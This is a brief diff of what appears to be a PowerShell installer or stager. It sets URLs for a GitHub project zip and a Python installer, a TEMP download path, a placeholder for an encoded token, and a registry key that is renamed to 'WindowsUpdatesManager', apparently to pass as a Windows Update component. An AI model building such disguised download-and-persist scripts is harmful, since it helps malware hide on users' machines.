@@ -1,7 +1,7 @@
 $prjRl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
 $ptnRl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
 $ptnIn = "$($env:TEMP)\python.exe"
-$rp = "HKCU:\Software\WindowsUpdates"
+$rp = "HKCU:\Software\WindowsUpdatesManager"
 $pn = "a"
 $pp = "GZipped, Base 64 Encoded token here"
 
